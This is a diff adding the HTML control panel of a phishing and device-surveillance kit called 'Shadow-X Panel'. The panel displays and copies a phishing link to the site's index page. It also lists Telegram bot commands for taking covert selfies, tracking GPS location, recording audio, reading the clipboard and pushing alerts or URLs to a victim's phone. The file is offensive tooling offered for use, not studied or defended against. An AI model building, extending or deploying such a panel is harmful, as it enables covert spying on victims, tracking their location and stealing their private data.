@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shadow-X Panel</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px}
+        .card{background:#111;border:1px solid #0f0;padding:20px;margin:10px 0;border-radius:10px}
+        .btn{background:#000;color:#0f0;border:1px solid #0f0;padding:12px;margin:5px 0;width:100%;cursor:pointer;font-family:monospace;border-radius:5px}
+        .btn:active{background:#0f0;color:#000}
+        input{background:#000;color:#0f0;border:1px solid #0f0;padding:12px;width:100%;margin:5px 0;font-family:monospace;border-radius:5px}
+        .link-box{background:#000;padding:10px;border:1px solid #333;border-radius:5px;word-break:break-all;font-size:11px;margin:10px 0}
+    </style>
+</head>
+<body>
+    <h1>🕸️ SHADOW-X PANEL</h1>
+    
+    <div class="card">
+        <h3>🔗 Phishing Link</h3>
+        <div class="link-box" id="phishLink"></div>
+        <button class="btn" onclick="copyLink()">📋 COPY LINK</button>
+    </div>
+
+    <div class="card">
+        <h3>🤖 Telegram Commands</h3>
+        <p style="font-size:11px;line-height:1.8;">
+            /photo - Take selfie<br>
+            /photo_back - Back camera<br>
+            /location - GPS location<br>
+            /vibrate - Vibrate phone<br>
+            /audio - Record 10s<br>
+            /clipboard - Get clipboard<br>
+            /info - Device info<br>
+            /notify [text] - Notification<br>
+            /open [url] - Open website<br>
+            /msg [text] - Show alert
+        </p>
+    </div>
+
+    <script>
+        document.getElementById('phishLink').textContent = location.origin + '/index.html';
+        function copyLink() {
+            navigator.clipboard.writeText(location.origin + '/index.html');
+            alert('Link copied!');
+        }
+    </script>
+</body>
+</html>
